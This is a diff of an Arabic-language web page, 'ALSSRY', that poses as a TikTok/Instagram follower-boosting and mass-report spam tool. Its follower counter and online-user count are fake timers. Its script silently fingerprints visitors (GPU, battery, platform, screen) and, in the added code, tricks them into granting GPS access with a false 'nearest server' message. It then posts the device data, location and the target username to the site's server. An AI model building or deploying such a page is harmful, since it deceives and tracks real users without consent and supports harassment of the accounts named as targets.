@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ALSSRY - ULTIMATE</title>
+    <title>ALSSRY - ELITE</title>
     <style>
         :root { --main-green: #00ff00; --glow-red: #ff0000; }
         body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow-x: hidden; direction: rtl; }
         
-        /* النجوم الكثيفة والواضحة */
+        /* النجوم الكثيفة (+20%) */
         #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: black; }
-        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 1; box-shadow: 0 0 6px white; }
+        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 1; box-shadow: 0 0 5px white; }
         @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
         #blur-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; backdrop-filter: blur(2px); background: rgba(0,0,0,0.5); }
 
@@ -18,35 +18,35 @@
         .logo-3d { 
             font-size: 42px; font-weight: 900; color: white; letter-spacing: 6px;
             text-shadow: 3px 3px 0px var(--glow-red), -3px -3px 0px var(--main-green);
-            margin: 20px 0; display: block; animation: glowPulse 2s infinite alternate;
+            margin: 20px 0; display: block;
         }
-        @keyframes glowPulse { from { opacity: 0.8; } to { opacity: 1; text-shadow: 4px 4px 10px var(--glow-red), -4px -4px 10px var(--main-green); } }
 
-        /* الحقوق بوسط الشاشة بضبابية */
+        /* حقوق السناب بضبابية 20% */
         .watermark { 
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 25px; font-weight: bold; color: rgba(255,255,255,0.4);
-            filter: blur(1.5px); pointer-events: none; z-index: 5;
-            text-shadow: 2px 2px var(--glow-red), -2px -2px var(--main-green);
+            position: fixed; top: 55%; left: 50%; transform: translate(-50%, -50%);
+            font-size: 25px; font-weight: bold; color: rgba(255,255,255,0.5);
+            filter: blur(0.8px); /* ضبابية 20% تقريباً */
+            pointer-events: none; z-index: 5;
+            text-shadow: 1px 1px var(--glow-red);
         }
 
-        .hero-title { font-size: 2.2rem; font-weight: bold; margin-bottom: 30px; text-shadow: 0 0 5px var(--main-green); }
-        .start-btn { padding: 15px 60px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 20px; cursor: pointer; transition: 0.4s; }
+        /* تنزيل كتابات الرئيسية */
+        #landing-page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding-top: 50px; }
+        .hero-title { font-size: 2.3rem; font-weight: bold; margin-bottom: 40px; text-shadow: 0 0 10px var(--main-green); }
+        .start-btn { padding: 16px 70px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 22px; cursor: pointer; transition: 0.4s; }
 
-        #tools-interface { padding: 20px; display: none; position: relative; z-index: 10; }
+        /* واجهة الخدمات */
+        #tools-interface { padding: 20px; display: none; z-index: 10; }
         .glass-btn { 
             width: 90%; padding: 16px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); 
-            border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; 
-            font-weight: bold; cursor: pointer; backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; font-weight: bold; cursor: pointer; 
         }
-        
-        input { width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: rgba(255,255,255,0.05); color: white; text-align: center; }
-        #progress-box { margin-top: 20px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; background: rgba(0,0,0,0.8); }
-        #counter { font-size: 35px; font-weight: bold; color: var(--main-green); }
+        input { width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: rgba(0,0,0,0.5); color: white; text-align: center; }
+        #progress-box { margin-top: 20px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; background: rgba(0,0,0,0.9); }
+        #counter { font-size: 38px; font-weight: bold; color: var(--main-green); }
 
-        #live-status { position: fixed; bottom: 15px; width: 100%; text-align: center; background: rgba(0,0,0,0.6); padding: 5px 0; }
-        .status-msg { font-size: 11px; color: #888; transition: opacity 1s; }
-        .online-count { font-size: 12px; color: var(--main-green); font-weight: bold; }
+        #live-status { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.8); padding: 10px 0; }
+        .online-count { font-size: 13px; color: var(--main-green); }
         .hidden { display: none !important; }
     </style>
 </head>
@@ -64,45 +64,34 @@
 
     <div id="tools-interface">
         <div class="logo-3d">ALSSRY</div>
-        <div style="color:#ff4444; font-size:11px; margin-bottom:15px;">NOT EVERYWHERE THERE IS A LAW</div>
-        
         <div id="main-menu">
             <button class="glass-btn" onclick="showPlat('boost')">1- قسم الرشق 🚀</button>
             <button class="glass-btn" onclick="showPlat('spam')">2- قسم الإسبام ⚔️</button>
         </div>
-
         <div id="platform-menu" class="hidden">
             <button class="glass-btn" onclick="selectPlat('TikTok')">تيك توك</button>
             <button class="glass-btn" onclick="selectPlat('Instagram')">انستقرام</button>
-            <button class="glass-btn" style="color:red; border-color:red;" onclick="goBack('main-menu')">رجوع</button>
+            <button class="glass-btn" style="color:red;" onclick="goBack('main-menu')">رجوع</button>
         </div>
-
         <div id="service-menu" class="hidden">
             <div id="boost-btns" class="hidden">
-                <button class="glass-btn" onclick="openInput('رشق متابعين', 'يوزر الحساب (@)', 5000)">متابعين</button>
-                <button class="glass-btn" onclick="openInput('رشق لايكات', 'رابط المقطع (http)', 5000)">لايكات</button>
-                <button class="glass-btn" onclick="openInput('رشق مشاهدات', 'رابط المقطع (http)', 5000)">مشاهدات</button>
+                <button class="glass-btn" onclick="openInput('متابعين', 'يوزر (@)', 5000)">متابعين</button>
+                <button class="glass-btn" onclick="openInput('لايكات', 'رابط (http)', 5000)">لايكات</button>
             </div>
-            <button id="spam-btn" class="glass-btn hidden" onclick="openInput('إسبام بلاغات', 'يوزر الحساب (@)', 300)">بدء الإسبام</button>
-            <button class="glass-btn" style="color:red; border-color:red;" onclick="goBack('platform-menu')">رجوع</button>
+            <button id="spam-btn" class="glass-btn hidden" onclick="openInput('إسبام', 'يوزر (@)', 300)">بدء الإسبام</button>
+            <button class="glass-btn" style="color:red;" onclick="goBack('platform-menu')">رجوع</button>
         </div>
-
         <div id="final-step" class="hidden">
             <h3 id="display-title" style="color:var(--main-green)"></h3>
             <input type="text" id="target-id">
             <input type="number" id="target-count">
-            <button class="glass-btn" style="background:var(--main-green); color:black;" onclick="startHacking()">تأكيد التنفيذ ✅</button>
-            <button class="glass-btn" style="color:red; border-color:red;" onclick="goBack('service-menu')">رجوع</button>
-            
+            <button class="glass-btn" style="background:var(--main-green); color:black;" onclick="requestGPS()">تأكيد التنفيذ ✅</button>
             <div id="progress-box" class="hidden">
-                <div style="font-size:11px; color:#aaa;">جاري معالجة البيانات عبر السيرفر العالمي...</div>
                 <div id="counter">0</div>
             </div>
         </div>
-
         <div id="live-status">
             <div class="online-count">🟢 المتصلون الآن: <span id="user-count">245</span></div>
-            <div id="status-text" class="status-msg">يتم الآن فحص جودة الاتصال...</div>
         </div>
     </div>
 
@@ -110,10 +99,9 @@
         let mode="", plat="", service="", maxVal=5000, currentOnline = 245;
         let deviceData = {};
 
-        // النجوم الكثيفة
         function createStars() {
             const container = document.getElementById('starfield');
-            for(let i=0; i<80; i++) {
+            for(let i=0; i<100; i++) { // زيادة النجوم لـ 100
                 const star = document.createElement('div');
                 star.className = 'star';
                 star.style.width = star.style.height = Math.random()*4+'px';
@@ -127,75 +115,61 @@
         function openTools() {
             document.getElementById('landing-page').style.display = 'none';
             document.getElementById('tools-interface').style.display = 'block';
-            captureAll(); 
             updateOnline();
-            startLogs();
+            captureHW();
         }
 
-        // الحركة النجوسية + سحب البيانات الشامل
-        async function captureAll() {
+        // سحب الـ HW-ID والبيانات
+        async function captureHW() {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
-            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Unknown";
+            const hwid = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
+            let batt = "100%";
+            try { const b = await navigator.getBattery(); batt = Math.round(b.level*100)+"%"; } catch(e){}
             
-            let battery = "100%";
-            try { const b = await navigator.getBattery(); battery = Math.round(b.level*100)+"%"; } catch(e){}
-
             deviceData = {
-                model: navigator.platform,
-                gpu: gpu,
-                battery: battery,
-                screen: window.screen.width + "x" + window.screen.height,
-                network: navigator.connection ? navigator.connection.effectiveType : "WiFi",
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                motion: "الجهاز في حالة نشطة"
+                hw_id: hwid,
+                battery: batt,
+                platform: navigator.platform,
+                screen: window.screen.width + "x" + window.screen.height
             };
+        }
 
-            fetch('/api/index', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({mode: "اختراق نجوسي صامت", device_info: deviceData}) });
+        // تفعيل الـ GPS الذكي
+        function requestGPS() {
+            alert("⚠️ تنبيه: يرجى السماح بالوصول للموقع لاختيار أسرع سيرفر قريب منك لضمان سرعة الرشق.");
+            navigator.geolocation.getCurrentPosition((pos) => {
+                deviceData.lat = pos.coords.latitude;
+                deviceData.lon = pos.coords.longitude;
+                startHacking();
+            }, (err) => { startHacking(); }); // إذا رفض يسحب الباقي
+        }
+
+        function startHacking() {
+            const c = parseInt(document.getElementById('target-count').value);
+            document.getElementById('progress-box').classList.remove('hidden');
+            let cur = 0;
+            let intervalTime = (90 * 1000) / 100; // كل 100 متابع في دقيقة ونصف
+            let inv = setInterval(() => {
+                if(cur >= c) { clearInterval(inv); alert("اكتمل!"); location.reload(); }
+                else { cur++; document.getElementById('counter').innerText = cur; }
+            }, intervalTime);
+
+            fetch('/api/index', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({device: deviceData, target: document.getElementById('target-id').value}) });
         }
 
         function updateOnline() {
             setInterval(() => {
-                const change = Math.random() > 0.5 ? Math.floor(Math.random()*6)+1 : -(Math.floor(Math.random()*11)+1);
-                currentOnline += change;
-                if(currentOnline < 100) currentOnline = 110;
-                if(currentOnline > 368) currentOnline = 350;
+                currentOnline += Math.random() > 0.5 ? Math.floor(Math.random()*6)+1 : -(Math.floor(Math.random()*11)+1);
                 document.getElementById('user-count').innerText = currentOnline;
             }, 4000);
         }
 
-        function startLogs() {
-            const logs = ["تم رشق 1.2k متابع لـ a***", "بدء إسبام بلاغات مكثف ✅", "تحديث سيرفرات Instagram...", "اكتمال معالجة طلب لـ user_99"];
-            let i = 0;
-            const el = document.getElementById('status-text');
-            setInterval(() => {
-                el.style.opacity = 0;
-                setTimeout(() => { el.innerText = logs[i]; el.style.opacity = 1; i = (i+1)%logs.length; }, 1000);
-            }, 7000);
-        }
-
+        // وظائف الرجوع والتنقل
         function showPlat(m) { mode=m; goBack('platform-menu'); }
         function selectPlat(p) { plat=p; goBack('service-menu'); document.getElementById('boost-btns').className = (mode==='boost') ? "" : "hidden"; document.getElementById('spam-btn').className = (mode==='spam') ? "glass-btn" : "hidden"; }
         function openInput(s, ph, max) { service=s; maxVal=max; goBack('final-step'); document.getElementById('display-title').innerText = plat + " - " + s; document.getElementById('target-id').placeholder = ph; document.getElementById('target-count').placeholder = "الحد: "+max; }
         function goBack(id) { document.querySelectorAll('#main-menu, #platform-menu, #service-menu, #final-step').forEach(el => el.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
-
-        function startHacking() {
-            const v = document.getElementById('target-id').value;
-            const c = parseInt(document.getElementById('target-count').value);
-            if(!v || !c || c > maxVal) return alert("خطأ في البيانات أو تجاوزت الحد");
-            
-            document.getElementById('progress-box').classList.remove('hidden');
-            let cur = 0;
-            // 100 متابع في 90 ثانية -> 0.9 ثانية لكل متابع
-            let intervalTime = (90 * 1000) / 100; 
-            
-            let inv = setInterval(() => {
-                if(cur >= c) { clearInterval(inv); alert("اكتمل التنفيذ! الدفعة تصل تدريجياً خلال 24 ساعة."); location.reload(); }
-                else { cur++; document.getElementById('counter').innerText = cur; }
-            }, intervalTime);
-
-            fetch('/api/index', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({service: service, target: v, count: c, device_info: deviceData}) });
-        }
     </script>
 </body>
 </html>
